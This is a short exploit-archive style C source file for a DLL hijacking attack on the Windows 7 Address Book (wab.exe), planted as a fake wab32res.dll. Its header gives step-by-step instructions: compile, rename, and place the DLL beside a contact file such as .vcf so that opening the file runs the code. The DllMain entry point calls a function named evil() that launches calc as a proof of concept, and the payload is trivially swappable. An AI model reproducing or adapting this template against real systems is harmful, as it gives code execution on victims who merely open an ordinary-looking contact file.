/*
Exploit Title: Microsoft Windows 7 wab.exe DLL Hijacking Exploit (wab32res.dll)
Date: 24/08/2010
Author: TheLeader
Email: gsog2009 [a7] hotmail [d0t] com
Version: 6.1.7600 and prior
Tested on: Windows 7 x86 (6.1.7600)

There's a chance this one works with vista.

Instructions:
Compile and rename to wab32res.dll, create a file in the same dir with one of the following extensions:
.vcf / .p7c / .group / .contact

Double click & watch a sexy calculator pop =X

*Random noises* to all the great guys at forums.hacking.org.il
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  evil();
  return 0;
}
